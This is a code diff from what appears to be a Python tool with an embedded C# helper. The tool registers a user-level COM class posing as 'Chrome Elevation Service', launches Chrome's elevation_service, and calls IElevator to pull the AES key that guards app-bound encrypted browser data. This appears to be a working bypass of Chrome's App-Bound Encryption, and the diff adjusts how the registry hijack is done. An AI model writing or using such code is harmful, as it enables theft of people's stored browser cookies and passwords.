@@ -2708,31 +2708,28 @@ def _delete_hkcu_localserver32(winreg: Any, clsid: str, access: int) -> None:
 
 
 def _register_hkcu_elevator_localserver(exe: Path) -> str:
-    """HKCU CLSID {708860E0-…} + LocalServer32 --console -Embedding.
+    """HKCU CLSID {708860E0-…} so the 151 class stays visible.
 
-    That is the 151 class 5b94422 found (not CLASSNOTREG). Unique AppID
-    keeps HKLM LocalService / Start-Service out. We also launch the exe
-    ourselves with -Embedding so CoCreate binds to a running object.
+    Delete leftover LocalServer32 — that key makes CoCreate launch
+    elevation_service as a COM LocalServer and times out 0x80080005.
+    Unique AppID keeps HKLM LocalService / Start-Service out. The
+    chrome_dir helper binds to a user-mode --console -Embedding process.
     """
     try:
         import winreg  # type: ignore[import-not-found]
     except ImportError:
         return "winreg"
-    cmd = _localserver32_cmd(exe)
     access = winreg.KEY_WRITE | winreg.KEY_READ
     if hasattr(winreg, "KEY_WOW64_64KEY"):
         access |= winreg.KEY_WOW64_64KEY
     clsids = tuple(dict.fromkeys(clsid for clsid, _ in _CHROME_ELEVATOR))
     try:
         for clsid in clsids:
+            _delete_hkcu_localserver32(winreg, clsid, access)
             clsid_path = rf"Software\Classes\CLSID\{clsid}"
             with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, clsid_path, 0, access) as key:
                 winreg.SetValueEx(key, "", 0, winreg.REG_SZ, "Chrome Elevation Service")
                 winreg.SetValueEx(key, "AppID", 0, winreg.REG_SZ, _ELEVATOR_APPID_HKCU)
-            with winreg.CreateKeyEx(
-                winreg.HKEY_CURRENT_USER, clsid_path + r"\LocalServer32", 0, access
-            ) as key:
-                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
             with winreg.CreateKeyEx(
                 winreg.HKEY_CURRENT_USER,
                 rf"Software\Classes\AppID\{_ELEVATOR_APPID_HKCU}",
@@ -3221,7 +3218,8 @@ def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
 
 
 # Minimal IElevator client. stdin = APPB-stripped blob; stdout = AES key only.
-# HKCU LocalServer32 is "--console -Embedding" (user-mode COM, not Start-Service).
+# Never write LocalServer32 (that launches the service as COM LocalServer).
+# Start elevation_service --console -Embedding, then CoCreate.
 _ABE_HELPER_CS = r"""
 using System;
 using System.IO;
@@ -3258,14 +3256,11 @@ class K {
   }
 
   static void RegisterLocalServer(string exe) {
-    if (string.IsNullOrEmpty(exe) || !File.Exists(exe)) return;
-    string cmd = (exe.IndexOf(' ') >= 0 ? ("\"" + exe + "\"") : exe) + " --console -Embedding";
+    try { Registry.CurrentUser.DeleteSubKey(@"Software\Classes\CLSID\" + Clsid + @"\LocalServer32", false); } catch {}
     using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid)) {
       k.SetValue("", "Chrome Elevation Service");
       k.SetValue("AppID", AppId);
     }
-    using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\CLSID\" + Clsid + @"\LocalServer32"))
-      k.SetValue("", cmd);
     using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\AppID\" + AppId)) {
       k.SetValue("", "Chrome Elevation Service");
       k.SetValue("RunAs", "");
